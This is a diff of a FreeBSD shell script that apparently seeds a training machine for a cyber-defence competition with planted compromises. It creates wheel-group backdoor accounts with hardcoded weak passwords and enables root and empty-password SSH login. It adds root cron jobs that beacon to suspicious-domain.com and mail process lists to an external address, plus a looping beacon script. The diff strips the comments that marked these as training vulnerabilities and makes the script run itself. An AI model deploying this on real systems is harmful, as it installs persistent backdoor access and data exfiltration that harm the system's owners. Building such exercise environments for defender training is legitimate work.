@@ -18,21 +18,19 @@ backup() {
 users() {
     if ! grep -q "redteam" /etc/passwd; then
         pw useradd redteam -c "do not remove" -s /bin/sh -m
-        echo "redteam:letredin" | chpasswd
+        echo "letredin" | passwd --stdin redteam
         pw groupmod wheel -m redteam
     fi
     
     if ! grep -q "ccdc" /etc/passwd; then
         pw useradd ccdc -c "ccdc" -s /bin/sh -m
-        echo "ccdc:password123" | chpasswd
+        echo "password123" | passwd --stdin ccdc
         pw groupmod wheel -m ccdc
     fi
 }
 
 ssh() {
     cat >> /etc/ssh/sshd_config << 'EOF'
-
-# Training vulnerabilities - INSECURE SETTINGS
 PermitRootLogin yes
 PasswordAuthentication yes
 PermitEmptyPasswords yes
@@ -42,25 +40,24 @@ X11Forwarding yes
 AllowTcpForwarding yes
 EOF
 
-    service openssh onestart 2>/dev/null
+    # This will kick people out
+    # service sshd onestart 2>/dev/null
 }
 
 cron() {
     cat >> /etc/crontab << 'EOF'
 
-# Suspicious scheduled tasks
-*/5 * * * * root /home/root/system_check.sh > /dev/null 2>&1
+*/5 * * * * root /root/system_check.sh > /dev/null 2>&1
 0 2 * * * root /usr/local/bin/data_collector.sh
 */15 * * * * root curl -s http://suspicious-domain.com/beacon > /dev/null
 EOF
     
-    cat > /home/root/system_check.sh << 'EOF'
+    cat > /root/system_check.sh << 'EOF'
 #!/bin/sh
-# Suspicious system monitoring script
 ps aux | grep -E "(ssh|http|ftp)" | mail -s "System Report" external@domain.com
 netstat -an > /tmp/network_state.log
 EOF
-    chmod +x /home/root/system_check.sh
+    chmod +x /root/system_check.sh
     
     cat > /usr/local/bin/data_collector.sh << 'EOF'
 #!/bin/sh
@@ -97,7 +94,7 @@ EOF
 }
 
 beacon() {
-    cat > /home/root/network_beacon.sh << 'EOF'
+    cat > /root/network_beacon.sh << 'EOF'
 #!/bin/sh
 # Network beacon script
 while true; do
@@ -106,7 +103,7 @@ while true; do
     sleep 300
 done
 EOF
-    chmod +x /tmp/network_beacon.sh    
+    chmod +x /root/network_beacon.sh    
 }
 
 fake_logs() {
@@ -166,7 +163,7 @@ EOF
 }
 
 main() {
-    backups
+    backup
     users
     ssh
     cron
@@ -176,3 +173,5 @@ main() {
     fake_evidence
     system_configs
 }
+
+main
